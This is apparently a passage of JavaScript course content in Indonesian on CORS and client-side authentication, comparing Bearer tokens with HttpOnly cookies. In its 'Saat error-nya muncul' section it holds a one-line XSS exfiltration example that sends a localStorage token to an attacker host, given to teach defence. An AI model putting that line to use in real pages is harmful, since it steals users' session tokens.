        'Header `Vary: Origin` sering dilupakan dan akibatnya nyata. Tanpa itu, cache di antara klien dan server bisa menyimpan respons beserta header `Access-Control-Allow-Origin` untuk satu asal, lalu menyajikannya kepada asal lain. Hasilnya permintaan yang seharusnya lolos justru ditolak, dan bugnya hilang timbul tergantung isi cache. `Vary: Origin` memberi tahu cache bahwa responsnya berbeda per asal.',
      ),
      p(
        'Blok `OPTIONS` menangani permintaan pendahuluan. Peramban mengirimnya lebih dulu untuk permintaan yang dianggap tidak sederhana, yaitu yang memakai method selain `GET`, `HEAD`, dan `POST`, atau yang membawa header khusus seperti `Authorization` dan `Content-Type: application/json`. Kalau server tidak menjawab `OPTIONS` dengan benar, permintaan sungguhannya tidak akan pernah dikirim. Header `Access-Control-Max-Age` membuat peramban menyimpan jawaban pendahuluan itu, sehingga tidak setiap permintaan didahului satu permintaan tambahan.',
      ),
      code(
        'text',
        `
        # Diuji di Chromium: bintang tidak boleh dipakai bersama kredensial.
        Access to fetch at 'http://127.0.0.1:4322/cors-kredensial' from origin
        'http://127.0.0.1:4321' has been blocked by CORS policy: The value of the
        'Access-Control-Allow-Origin' header in the response must not be the
        wildcard '*' when the request's credentials mode is 'include'.
        `,
        { caption: 'Aturan yang paling sering menyandung saat cookie mulai dipakai.' },
      ),
      p(
        'Nilai bintang berarti siapa pun boleh, dan mengizinkan siapa pun sambil mengirimkan cookie pengguna adalah kombinasi yang berbahaya. Peramban menolaknya secara mutlak. Begitu aplikasimu memakai cookie untuk autentikasi, kamu wajib menyebut asal yang diizinkan satu per satu, dan itu justru bagus karena memaksa daftar yang eksplisit.',
      ),
      callout(
        'danger',
        'Memantulkan header `Origin` apa adanya sama saja dengan tidak punya CORS',
        'Sebagian contoh di internet menyarankan menyalin nilai `req.headers.origin` langsung ke `Access-Control-Allow-Origin`. Itu berarti setiap situs di internet lolos, termasuk situs jahat yang membuat pengguna yang sedang masuk memanggil API-mu dengan cookie mereka. Cocokkan terhadap daftar yang kamu tulis sendiri, dan jangan pernah memakai pencocokan awalan.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat bentuk berikut mencakup hampir seluruh kegagalan CORS yang akan kamu temui. Dua yang pertama diambil dari Chromium sungguhan.',
      ),
      code(
        'text',
        `
        has been blocked by CORS policy: No 'Access-Control-Allow-Origin'
        header is present on the requested resource.
        `,
        { caption: 'Server tidak mengirim header CORS sama sekali.' },
      ),
      p(
        'Ini bentuk paling dasar dan paling sering. Servernya menjawab dengan baik, dan peramban menyembunyikan jawabannya dari kodemu karena tidak ada izin yang menyertainya. Perlu ditegaskan, permintaannya **sudah sampai dan sudah diproses** server. Kalau permintaan itu mengubah data, perubahannya tetap terjadi walaupun kamu tidak bisa membaca jawabannya. CORS melindungi pembacaan jawaban, bukan mencegah permintaan.',
      ),
      code(
        'text',
        `
        has been blocked by CORS policy: The value of the
        'Access-Control-Allow-Origin' header in the response must not be
        the wildcard '*' when the request's credentials mode is 'include'.
        `,
        { caption: 'Bintang dipakai bersama pengiriman cookie.' },
      ),
      p(
        "Muncul saat kamu menambahkan `credentials: 'include'` pada `fetch` untuk mengirim cookie. Perbaikannya di server, yaitu ganti bintang dengan asal yang tepat. Kalau kamu tidak bisa mengubah servernya, misalnya karena itu API pihak ketiga, satu-satunya jalan adalah tidak mengirim kredensial atau meneruskan permintaan lewat servermu sendiri.",
      ),
      code(
        'text',
        `
        Method PATCH is not allowed by Access-Control-Allow-Methods
        in preflight response.
        `,
        { caption: 'Permintaan pendahuluan dijawab, tapi methodnya tidak disebut.' },
      ),
      p(
        'Bentuk ini menandakan server sudah menangani CORS sebagian, dan yang kurang hanya daftar methodnya. Hal yang sama terjadi untuk header, dengan pesan yang menyebut `Access-Control-Allow-Headers`. Perhatikan header kustom seperti `X-Request-Id` juga harus disebut, dan lupa menyebutnya adalah penyebab yang sering saat sebuah header baru ditambahkan ke pembungkus `fetch`.',
      ),
      code(
        'text',
        `
        const r = await fetch(alamat, { mode: 'no-cors' });
        console.log(r.type, r.status, (await r.text()).length);

        opaque 0 0
        `,
        { caption: 'Diuji di Chromium. Permintaannya terkirim, dan jawabannya tidak bisa dibaca.' },
      ),
      p(
        "Opsi `mode: 'no-cors'` sering ditemukan orang saat mencari cara mematikan CORS, dan ia **tidak** melakukan itu. Yang ia lakukan adalah membuat permintaannya tetap terkirim tanpa memicu galat, dengan konsekuensi responsnya menjadi opaque. Statusnya nol, badannya kosong, dan headernya tidak bisa dibaca. Ia hanya berguna untuk hal yang memang tidak perlu dibaca, misalnya mengirim penanda analitik.",
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            "`No 'Access-Control-Allow-Origin' header is present`",
            'Server tidak mengirim header CORS',
            'Tambahkan headernya di server dengan daftar asal yang eksplisit',
          ],
          [
            "`must not be the wildcard '*' when ... 'include'`",
            'Bintang dipakai bersama pengiriman cookie',
            'Ganti bintang dengan asal yang tepat, dan tambahkan `Vary: Origin`',
          ],
          [
            '`Method ... is not allowed by Access-Control-Allow-Methods`',
            'Jawaban pendahuluan tidak menyebut methodnya',
            'Tambahkan methodnya di jawaban `OPTIONS`',
          ],
          [
            'Respons `opaque` dengan status nol',
            "`mode: 'no-cors'` dipakai",
            'Hapus opsinya, dan perbaiki CORS di server',
          ],
          [
            'Bekerja lalu gagal secara acak',
            'Cache menyimpan respons tanpa `Vary: Origin`',
            'Tambahkan `Vary: Origin` di server',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'CORS adalah topik yang paling banyak melahirkan solusi keliru yang beredar luas, sebagian karena orang mencarinya dalam keadaan terdesak.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            "Memakai `mode: 'no-cors'` untuk mematikan CORS",
            'Namanya terdengar seperti melewati CORS',
            'Responsnya menjadi opaque dengan status nol dan badan kosong. Kamu tidak bisa membaca apa pun',
          ],
          [
            'Memasang ekstensi peramban yang mematikan CORS',
            'Di layarku sudah bekerja',
            'Hanya di peramban milikmu. Pengguna tidak memasangnya, dan bugnya baru muncul di produksi',
          ],
          [
            'Memantulkan `Origin` apa adanya di server',
            'Fleksibel dan langsung bekerja untuk semua lingkungan',
            'Setiap situs di internet menjadi diizinkan. Ini sama saja dengan tidak punya perlindungan',
          ],
          [
            'Mengira CORS mencegah permintaannya terkirim',
            'Peramban kan memblokirnya',
            'Untuk permintaan sederhana, permintaannya tetap sampai dan tetap diproses. Yang diblokir hanya pembacaan jawabannya',
          ],
          [
            'Menambahkan header CORS di sisi klien',
            'Headernya kan tentang klien',
            'Header CORS dikirim **server** di dalam responsnya. Tidak ada satu pun yang bisa dilakukan klien untuk mengubahnya',
          ],
          [
            'Menganggap CORS adalah lapisan keamanan API',
            'Ia memang memblokir akses',
            'CORS hanya berlaku di peramban. Permintaan dari `curl`, dari skrip, atau dari server lain tidak tersentuh sama sekali. Autentikasi tetap wajib',
          ],
        ],
      ),
      p(
        'Baris keempat dan keenam bersama-sama membentuk pemahaman yang paling penting tentang CORS. Ia bukan penjaga pintu server melainkan aturan yang dijalankan peramban demi melindungi **penggunanya sendiri**, yaitu supaya situs jahat tidak bisa membaca data dari situs lain tempat pengguna sedang masuk. Server tetap wajib memeriksa siapa pemanggilnya, sebab siapa pun bisa memanggil API-mu tanpa peramban sama sekali.',
      ),
      callout(
        'tip',
        'Di pengembangan, proksi lebih baik daripada mematikan CORS',
        'Alat pembangun seperti Vite dan Next.js menyediakan proksi pengembangan yang meneruskan `/api` ke server backendmu. Dengan begitu peramban melihat semuanya berasal dari satu asal, dan CORS tidak pernah ikut campur. Keuntungan pentingnya, konfigurasi CORS di produksi tetap harus benar dan tidak tertutupi oleh kelonggaran di komputermu.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'Origin = protokol + host + port. Subdomain dihitung berbeda.',
        'Server tetap menerima dan memproses permintaannya — browser yang menahan responsnya.',
        'CORS adalah kontrol browser, bukan kontrol akses. Otorisasi tetap di server.',
        'JSON + `Authorization` hampir selalu memicu preflight `OPTIONS`.',
        'Allow-list origin yang persis; jangan `*` dengan credentials, jangan pantulkan `Origin`.',
      ),
      references(
        {
          label: 'Cross-Origin Resource Sharing (CORS)',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS',
          source: 'MDN',
          note: 'Rujukan utama sub-bab ini: preflight, header yang terlibat, dan syarat simple request.',
        },
        {
          label: 'Same-origin policy',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy',
          source: 'MDN',
          note: 'Aturan yang sebenarnya memblokir — CORS hanyalah cara server memberi pengecualian.',
        },
        {
          label: 'Access-Control-Allow-Origin',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Origin',
          source: 'MDN',
          note: 'Termasuk larangan memakai `*` bersama permintaan yang membawa credentials.',
        },
        {
          label: 'Origin',
          href: 'https://developer.mozilla.org/en-US/docs/Glossary/Origin',
          source: 'MDN',
          note: 'Definisi resmi: protokol + host + port, dan kenapa subdomain dihitung berbeda.',
        },
        {
          label: 'Fetch Standard — CORS protocol',
          href: 'https://fetch.spec.whatwg.org/#http-cors-protocol',
          source: 'WHATWG',
          note: 'Spesifikasi aslinya, source of truth untuk kapan preflight wajib dikirim.',
        },
      ),
    ],
  ),

  written(
    'auth-klien',
    'Autentikasi dari Sisi Klien: Bearer vs cookie',
    24,
    'Dua pola menyimpan identitas, dan daftar risiko masing-masing.',
    [
      p(
        'Setelah login, browser harus membuktikan siapa kamu di setiap permintaan berikutnya. Ada dua cara utama, dan keduanya punya risiko berbeda — bukan satu yang aman dan satu yang tidak.',
      ),

      terms(
        {
          term: 'autentikasi',
          meaning:
            'Dari *authentication*, terjemahannya **pembuktian identitas** — menjawab "siapa kamu". Bedakan dari **otorisasi** (*authorization*) yang menjawab "boleh apa saja kamu". Keduanya sering disingkat sama-sama "auth", padahal urusannya berbeda: kamu bisa terautentikasi tapi tetap tidak berhak.',
        },
        {
          term: 'Bearer token',
          meaning:
            'Artinya **token pembawa**. Untai teks yang dikirim di header `Authorization: Bearer <token>` sebagai bukti identitas. Namanya menjelaskan risikonya: **siapa pun yang membawanya diperlakukan sebagai pemiliknya** — tidak ada pemeriksaan tambahan apakah pembawanya memang orang yang berhak.',
        },
        {
          term: 'cookie',
          meaning:
            'Potongan data kecil yang disimpan browser dan **dikirim otomatis** ke server pada setiap permintaan ke domain itu. Sifat otomatis inilah kelebihan sekaligus kelemahannya: kamu tidak perlu mengurusnya, tapi ia juga ikut terkirim pada permintaan yang dipicu situs lain.',
        },
        {
          term: 'HttpOnly',
          meaning:
            'Penanda pada cookie yang membuatnya **tidak bisa dibaca JavaScript sama sekali**. Ini keunggulan besar cookie atas token di `localStorage`: kalau ada celah XSS, skrip penyerang tetap tidak bisa mencuri cookie yang ditandai `HttpOnly`.',
        },
        {
          term: 'Secure',
          meaning:
            'Penanda yang membuat cookie **hanya dikirim lewat HTTPS**. Tanpa itu, cookie ikut terkirim dalam bentuk terbaca pada koneksi biasa, dan siapa pun yang menyadap jaringan bisa mengambilnya.',
        },
        {
          term: 'SameSite',
          meaning:
            'Penanda yang mengatur **apakah cookie ikut terkirim** saat permintaan dipicu dari situs lain. Nilai `Lax` (bawaan sekarang) dan `Strict` adalah pertahanan utama terhadap CSRF, karena keduanya memutus jalur yang dipakai serangan itu.',
        },
        {
          term: 'CSRF',
          meaning:
            'Singkatan *Cross-Site Request Forgery*, terjemahannya **pemalsuan permintaan lintas situs**. Serangan di mana situs jahat memicu permintaan ke situsmu **memakai cookie login korban**. Perhatikan pembagian risikonya: pola cookie rentan CSRF, sementara pola Bearer rentan XSS. Tidak ada yang aman tanpa syarat — masing-masing menukar satu risiko dengan risiko lain.',
        },
        {
          term: 'access token',
          meaning:
            'Token berumur **pendek** (hitungan menit) yang dipakai untuk mengakses sumber daya. Umurnya sengaja dibuat pendek agar token yang dicuri cepat kedaluwarsa dengan sendirinya.',
        },
        {
          term: 'refresh token',
          meaning:
            'Token berumur **panjang** yang tugasnya hanya satu, yaitu menukar dirinya dengan access token baru. Ia disimpan lebih hati-hati, idealnya sebagai cookie `HttpOnly`, dan sebaiknya **dirotasi setiap kali dipakai**, sehingga kemunculan token lama menjadi tanda pencurian.',
        },
        {
          term: 'JWT',
          meaning:
            'Singkatan *JSON Web Token*, dibaca "jot". Format token yang membawa datanya sendiri dalam bentuk bertanda tangan. Satu hal yang wajib dipahami sejak awal: **isinya hanya di-encode base64, bukan dienkripsi** — siapa pun bisa membacanya. Jangan pernah menaruh apa pun yang rahasia di dalamnya.',
        },
      ),

      h2('Pola 1 — Bearer token di header'),
      code(
        'js',
        `
        const { token } = await fetch('/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password }),
        }).then((r) => r.json());

        // Setiap permintaan berikutnya
        await fetch('/api/profil', {
          headers: { Authorization: \`Bearer \${token}\` },
        });
        `,
      ),
      p(
        'Ciri pola ini ada pada kata **"setiap"** di komentar, karena token harus disertakan sendiri di tiap permintaan sebab tidak ada mekanisme browser yang melakukannya untukmu. Itu sekaligus kelebihan dan kekurangannya. Kelebihannya, kamu punya kendali penuh dan ia bekerja di mana saja, termasuk aplikasi mobile yang tidak punya konsep cookie. Kekurangannya, token itu harus **disimpan di suatu tempat yang bisa dibaca JavaScript**, dan di situlah letak risikonya. Awalan `Bearer` bukan hiasan, sebab ia menyatakan skema autentikasi yang dipakai dan server memang mengharapkannya persis begitu. Melewatkannya adalah penyebab umum `401` yang membingungkan karena tokennya jelas-jelas sudah dikirim.',
      ),
      table(
        ['Kelebihan', 'Kekurangan'],
        [
          [
            'Bekerja lintas domain tanpa masalah',
            '**Rentan XSS** — skrip apa pun di halamanmu bisa membacanya',
          ],
          ['Tidak butuh proteksi CSRF', 'Kamu yang harus menyimpannya di suatu tempat'],
          ['Cocok untuk aplikasi mobile', 'Sulit dicabut kalau memakai JWT stateless'],
        ],
      ),
      callout(
        'danger',
        'Di mana menyimpan token adalah pertanyaan yang salah',
        '`localStorage`, `sessionStorage`, dan variabel biasa **semuanya** bisa dibaca JavaScript. Kalau ada satu celah XSS di halamanmu, token tercuri — di mana pun ia disimpan. Menyimpan di memori (variabel modul) sedikit lebih baik karena hilang saat tab ditutup, tapi tetap tidak menyelesaikan XSS.',
      ),

      h2('Pola 2 — Cookie `HttpOnly`'),
      code(
        'js',
        `
        // Server menyetel cookie; JavaScript tidak pernah menyentuhnya
        // Set-Cookie: sesi=abc; HttpOnly; Secure; SameSite=Lax; Path=/

        await fetch('/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password }),
          credentials: 'include',
        });

        // Permintaan berikutnya — cookie ikut otomatis
        await fetch('/api/profil', { credentials: 'include' });

        document.cookie;   // tidak berisi 'sesi' — HttpOnly menyembunyikannya
        `,
      ),
      p(
        "Bandingkan dengan pola sebelumnya, karena **tidak ada satu pun header `Authorization` di sini** dan tidak ada token yang disimpan kodemu. Server menyetel cookie lewat `Set-Cookie` saat login, lalu browser melampirkannya **otomatis** di setiap permintaan berikutnya. Yang perlu kamu tulis hanya `credentials: 'include'`, dan itu pun hanya diperlukan bila API-nya berbeda origin. Baris terakhir adalah inti keamanannya, yaitu `document.cookie` **tidak memuat sesi itu** karena atribut `HttpOnly` menyembunyikannya dari JavaScript sepenuhnya. Dengan begitu, satu celah XSS di halamanmu tidak langsung berujung pada pencurian sesi. Penyerang masih bisa melakukan permintaan atas nama pengguna selama halamannya terbuka, tapi ia tidak bisa membawa pulang kredensialnya. Ongkosnya, karena cookie ikut otomatis, pola ini butuh proteksi CSRF yang dibahas di kotak berikutnya.",
      ),
      table(
        ['Atribut cookie', 'Gunanya'],
        [
          ['`HttpOnly`', '**JavaScript tidak bisa membacanya** — XSS tidak langsung mencuri sesi'],
          ['`Secure`', 'Hanya dikirim lewat HTTPS'],
          ['`SameSite=Lax`', 'Tidak ikut pada permintaan lintas situs, kecuali navigasi biasa'],
          ['`SameSite=Strict`', 'Tidak pernah ikut lintas situs'],
          ['`Path` / `Max-Age`', 'Cakupan dan umur'],
        ],
      ),

      h2('Perbandingan risiko'),
      table(
        ['Ancaman', 'Bearer di `localStorage`', 'Cookie `HttpOnly`'],
        [
          [
            'XSS',
            '**Token langsung tercuri**',
            'Sesi tidak terbaca; penyerang tetap bisa mengirim permintaan dari halamanmu',
          ],
          [
            'CSRF',
            'Kebal — token tidak ikut otomatis',
            '**Rentan** — butuh `SameSite` + token anti-CSRF',
          ],
          ['Lintas domain', 'Mudah', 'Perlu CORS + `credentials`'],
        ],
      ),
      callout(
        'info',
        'Kesimpulan yang jujur',
        'Untuk aplikasi web, **cookie `HttpOnly` + `SameSite` + proteksi CSRF** umumnya lebih aman, karena XSS adalah ancaman yang jauh lebih sering terjadi daripada CSRF. Bearer token lebih tepat untuk aplikasi mobile dan integrasi antar-layanan. Pilih berdasarkan itu, bukan berdasarkan yang lebih mudah ditulis.',
      ),

      h2('Refresh token'),
      code(
        'js',
        `
        // Access token berumur pendek (menit), refresh token lebih panjang.
        // Saat access token kedaluwarsa, tukar sekali — dan JANGAN sampai
        // sepuluh permintaan yang gagal bersamaan memicu sepuluh refresh.

        let refreshBerjalan = null;

        async function apiDenganRefresh(path, opsi) {
          let res = await fetch(path, opsi);

          if (res.status === 401) {
            refreshBerjalan ??= refreshToken().finally(() => { refreshBerjalan = null; });
            await refreshBerjalan;                 // semua menunggu satu refresh yang sama
            res = await fetch(path, opsi);         // coba sekali lagi
          }

          return res;
        }
        `,
      ),
      p(
        'Baris `refreshBerjalan ??= refreshToken().finally(...)` adalah intinya: `??=` hanya memulai `refreshToken()` baru kalau `refreshBerjalan` memang `null` atau `undefined` — begitu permintaan pertama yang gagal memulai refresh, `refreshBerjalan` langsung terisi Promise yang sedang berjalan, sehingga sembilan permintaan lain yang gagal bersamaan cukup ikut menunggu (`await refreshBerjalan`) Promise yang sama, bukan memicu sembilan refresh terpisah. `.finally(() => { refreshBerjalan = null; })` mengosongkannya kembali begitu refresh selesai, siap menampung permintaan refresh berikutnya kalau token kedaluwarsa lagi nanti.',
      ),

      h2('Yang tidak boleh dilakukan'),
      ol(
        '**Menaruh data rahasia di dalam JWT.** Payload-nya base64, bukan enkripsi — siapa pun bisa membacanya.',
        '**Mengandalkan `exp` di klien.** Server tetap wajib memverifikasi setiap permintaan.',
        '**Menyembunyikan tombol sebagai kontrol akses.** UI yang disembunyikan tetap bisa dipanggil lewat `curl`.',
        '**Menaruh kunci API di kode frontend.** Bundle klien bisa dibaca siapa pun — itu setara memublikasikannya.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Aplikasi punya halaman yang hanya boleh dibuka pengguna yang sudah masuk. Versi pertama menyimpan token di `localStorage` karena itu yang paling mudah dijangkau dari mana saja. Beberapa bulan kemudian ada satu ulasan produk yang tidak disaring dengan benar, dan dalam beberapa jam token milik ratusan pengguna sudah berada di server orang lain. Satu baris JavaScript di ulasan itu cukup untuk membaca seluruh isi `localStorage` lalu mengirimkannya.',
      ),
      p(
        'Perbandingan di bawah adalah keputusan paling penting di seluruh sub-bab ini, dan ia sering diambil tanpa pertimbangan karena satu sisinya jauh lebih mudah ditulis.',
      ),
      table(
        ['Aspek', 'Token di `localStorage`', 'Cookie `HttpOnly`'],
        [
          [
            'Bisa dibaca JavaScript',
            '**Ya.** Satu celah XSS cukup',
            'Tidak. JavaScript tidak melihatnya sama sekali',
          ],
          ['Dikirim otomatis', 'Tidak, kamu pasang sendiri di header', 'Ya, peramban mengirimnya'],
          [
            'Rentan CSRF',
            'Tidak, sebab tidak otomatis terkirim',
            'Ya, butuh `SameSite` dan token anti-CSRF',
          ],
          ['Bekerja lintas domain', 'Mudah', 'Perlu pengaturan CORS dan `SameSite=None`'],
          ['Bisa dihapus server', 'Tidak langsung', 'Ya, lewat respons'],
        ],
        'Tidak ada yang bebas risiko. Yang berbeda adalah jenis serangan yang harus kamu tutup.',
      ),
      p(
        'Kesimpulan yang dipegang aturan project ini tegas, yaitu token sesi yang berumur panjang **tidak** disimpan di `localStorage`. Alasannya asimetris. Risiko CSRF pada cookie bisa ditutup dengan `SameSite=Lax` dan satu token tambahan, dan keduanya adalah pekerjaan yang selesai. Risiko XSS pada `localStorage` tidak pernah selesai, sebab ia bergantung pada tidak adanya satu pun celah di seluruh halaman selamanya.',
      ),
      code(
        'js',
        `
        // Pola cookie HttpOnly: klien tidak menyentuh token sama sekali.
        await fetch('/api/masuk', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, sandi }),
          credentials: 'same-origin',      // kirim dan terima cookie
        });
        // Server membalas dengan:
        //   Set-Cookie: sesi=...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600

        // Permintaan berikutnya tidak menyebut token sama sekali.
        const respons = await fetch('/api/pesanan', { credentials: 'same-origin' });
        `,
        { filename: 'src/auth/masuk.js' },
      ),
      p(
        'Yang membuat pola ini kuat adalah tidak ada satu baris pun di kodemu yang memegang tokennya. Peramban menyimpannya di tempat yang tidak bisa dijangkau JavaScript, dan mengirimkannya sendiri pada tiap permintaan ke asal yang sama. Skrip jahat yang berhasil masuk ke halamanmu tetap tidak bisa membaca tokennya, walaupun ia bisa membuat permintaan atas nama pengguna selama pengguna masih di halaman itu.',
      ),
      p(
        'Empat penanda pada cookie itu masing-masing menutup satu hal. `HttpOnly` menyembunyikannya dari JavaScript. `Secure` membuatnya hanya dikirim lewat HTTPS. `SameSite=Lax` mencegahnya ikut terkirim pada permintaan yang berasal dari situs lain, dan itu yang menutup sebagian besar CSRF. `Max-Age` membuatnya kedaluwarsa sendiri. Melewatkan salah satunya membatalkan sebagian perlindungannya.',
      ),
      code(
        'js',
        `
        // Kalau memang harus memakai token di header, misalnya untuk API lintas domain,
        // simpan token akses berumur pendek di MEMORI, bukan di localStorage.
        let tokenAkses = null;          // hilang saat tab ditutup, dan itu memang benar

        export async function ambilDenganAuth(alamat, opsi = {}) {
          const kirim = (token) =>
            fetch(alamat, {
              ...opsi,
              headers: { ...opsi.headers, Authorization: \`Bearer \${token}\` },
            });

          let respons = await kirim(tokenAkses);

          if (respons.status === 401) {
            // Refresh token ada di cookie HttpOnly, jadi tidak pernah tersentuh JavaScript.
            const segar = await fetch('/api/refresh', {
              method: 'POST',
              credentials: 'same-origin',
            });
            if (!segar.ok) throw new ErrorSesi();

            ({ tokenAkses } = await segar.json());
            respons = await kirim(tokenAkses);      // coba SEKALI lagi, bukan berulang
          }

          return respons;
        }
        `,
        { filename: 'src/auth/ambil.js' },
      ),
      p(
        'Pembagian tugasnya yang membuat pola ini aman. Token akses berumur pendek, misalnya lima belas menit, disimpan di variabel biasa yang hilang saat tab ditutup. Token penyegar yang berumur panjang disimpan di cookie `HttpOnly`, sehingga tidak pernah tersentuh JavaScript. Celah XSS paling banter mendapat token akses yang akan kedaluwarsa sebentar lagi, bukan kunci yang berlaku berminggu-minggu.',
      ),
      p(
        'Baris `respons = await kirim(tokenAkses)` yang hanya dijalankan **sekali** setelah penyegaran itu disengaja. Kalau percobaan ulangnya dibuat berulang, token yang memang sudah dicabut akan memicu putaran tak berujung antara penyegaran dan pemanggilan. Batas satu kali membuat kegagalan yang sungguhan tetap sampai ke pemanggil.',
      ),
      callout(
        'danger',
        'Isi token bisa dibaca siapa pun, dan itu memang bukan rahasia',
        'JWT terdiri dari tiga bagian yang disandikan base64, bukan dienkripsi. Siapa pun yang memegangnya bisa membaca isinya dengan satu baris `atob`. Jangan pernah menaruh data yang tidak boleh dilihat pengguna di dalamnya, dan jangan pernah memercayai isinya di sisi klien untuk menentukan hak akses. Server yang memverifikasi tanda tangannya, dan server pula yang memutuskan.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Kegagalan autentikasi punya bentuk yang khas, dan sebagian besar kebingungan berasal dari tidak membedakan 401 dari 403.',
      ),
      code(
        'text',
        `
        const r = await fetch('/api/pesanan');
        console.log(r.status);

        401
        `,
        { caption: 'Cookie tidak ikut terkirim karena `credentials` tidak disetel.' },
      ),
      p(
        "Untuk permintaan ke asal yang sama, `fetch` mengirim cookie secara bawaan di peramban modern. Untuk permintaan lintas asal, ia **tidak** mengirimnya kecuali kamu menulis `credentials: 'include'`. Ini penyebab yang sangat sering saat frontend dan API berada di subdomain berbeda. Gejalanya khas, yaitu berhasil di komputer pengembang yang memakai proksi satu asal, dan gagal 401 di produksi.",
      ),
      code(
        'text',
        `
        Access to fetch at 'https://api.tokomu.id/pesanan' from origin
        'https://app.tokomu.id' has been blocked by CORS policy: The value of
        the 'Access-Control-Allow-Origin' header in the response must not be
        the wildcard '*' when the request's credentials mode is 'include'.
        `,
        { caption: 'Mengirim kredensial menuntut daftar asal yang eksplisit di server.' },
      ),
      p(
        "Begitu kamu menambahkan `credentials: 'include'` untuk mengirim cookie, konfigurasi CORS yang tadinya cukup dengan bintang berhenti berlaku. Server harus menyebut asalnya persis dan menambahkan `Access-Control-Allow-Credentials: true`. Ini menyambung langsung ke Sub-bab 5.6, dan urutan menemukannya biasanya memang begitu, yaitu CORS baru menjadi masalah setelah autentikasi ditambahkan.",
      ),
      code(
        'text',
        `
        // Pengguna diarahkan ke halaman masuk, lalu diarahkan lagi, lalu lagi.
        if (respons.status === 401 || respons.status === 403) keHalamanMasuk();
        `,
        { caption: 'Kode 403 diperlakukan sama dengan 401.' },
      ),
      p(
        'Kode 403 berarti sistem sudah tahu persis siapa penggunanya dan tetap menolak, misalnya karena ia bukan admin. Menyuruhnya masuk lagi tidak mengubah apa pun, sehingga ia masuk, diarahkan kembali ke halaman yang sama, ditolak lagi, dan seterusnya. Pisahkan keduanya, dan untuk 403 tampilkan pesan tegas beserta jalan keluar yang masuk akal seperti kembali ke beranda.',
      ),
      code(
        'text',
        `
        // Token disimpan di localStorage. Satu celah XSS di halaman mana pun:
        fetch('https://penyerang.id/?t=' + localStorage.getItem('token'));

        // Tidak ada error. Token milik pengguna sudah berpindah tangan.
        `,
        { caption: 'Tidak ada pesan apa pun, dan inilah kegagalan yang paling mahal.' },
      ),
      p(
        'Satu baris itu cukup, dan ia bisa masuk lewat ulasan yang tidak disaring, lewat pustaka pihak ketiga yang diretas, atau lewat iklan. Karena `localStorage` bisa dibaca seluruh skrip di asal yang sama, tidak ada pemisahan sama sekali antara kodemu dan kode asing yang berhasil masuk. Tidak ada peringatan, tidak ada log, dan kamu baru tahu saat ada yang melaporkan akun mereka dipakai orang lain.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '401 padahal pengguna baru saja masuk',
            'Cookie tidak terkirim karena `credentials` tidak disetel',
            "Tambahkan `credentials: 'include'` untuk permintaan lintas asal",
          ],
          [
            'CORS menolak setelah kredensial ditambahkan',
            'Bintang tidak boleh dipakai bersama kredensial',
            'Sebut asalnya persis di server, dan tambahkan `Allow-Credentials`',
          ],
          [
            'Pengguna berputar di halaman masuk',
            '403 diperlakukan seperti 401',
            'Bedakan keduanya, dan untuk 403 tampilkan pesan bukan pengalihan',
          ],
          [
            'Token bocor tanpa satu pun tanda',
            'Token disimpan di `localStorage` yang bisa dibaca skrip apa pun',
            'Pindahkan ke cookie `HttpOnly`, atau simpan token pendek di memori',
          ],
          [
            'Putaran tak berujung antara penyegaran dan pemanggilan',
            'Percobaan ulang setelah penyegaran tidak dibatasi',
            'Coba ulang tepat sekali, lalu lempar `ErrorSesi`',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Autentikasi di sisi klien penuh dengan pilihan yang terasa sepele saat ditulis dan menjadi mahal saat salah. Enam baris di bawah adalah yang paling sering.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menyimpan token sesi di `localStorage`',
            'Paling mudah dijangkau dari mana saja',
            'Satu celah XSS di halaman mana pun cukup untuk mencurinya. Pakai cookie `HttpOnly` untuk token berumur panjang',
          ],
          [
            'Menentukan tampilan menu admin dari isi token di klien',
            'Perannya kan tertulis di dalam token',
            'Isi token bisa dibaca dan dipalsukan di sisi klien. Menyembunyikan menu bukan kontrol akses, dan server tetap wajib menolak',
          ],
          [
            'Menyimpan kata sandi untuk fitur ingat saya',
            'Supaya tidak perlu mengetik lagi',
            'Tidak pernah ada alasan menyimpan kata sandi di klien. Yang disimpan adalah token sesi berumur panjang yang bisa dicabut server',
          ],
          [
            "Memakai `credentials: 'include'` untuk semua permintaan",
            'Supaya tidak lupa',
            'Cookie ikut terkirim ke asal yang tidak membutuhkannya, termasuk API pihak ketiga. Pakai `same-origin` sebagai bawaan',
          ],
          [
            'Menaruh token di parameter alamat',
            'Paling mudah',
            'Alamat tercatat di log server, riwayat peramban, dan header `Referer` saat pengguna mengklik tautan keluar',
          ],
          [
            'Tidak menyediakan cara keluar yang benar-benar mencabut sesi',
            'Menghapus token di klien sudah cukup',
            'Token yang sudah tersalin tetap berlaku sampai kedaluwarsa. Keluar harus memanggil server untuk mencabutnya',
          ],
        ],
      ),
      p(
        'Baris kedua layak ditegaskan karena ia sering dianggap cukup. Menyembunyikan tombol Hapus dari pengguna biasa memang benar sebagai pengalaman pengguna, dan sama sekali bukan perlindungan. Siapa pun bisa membuka DevTools, memanggil endpointnya langsung, dan kalau server tidak memeriksa, penghapusannya berhasil. Aturan project ini menyebutnya tegas, yaitu menyembunyikan tombol bukan kontrol akses.',
      ),
      callout(
        'info',
        'Materi ini punya kelanjutan yang jauh lebih dalam',
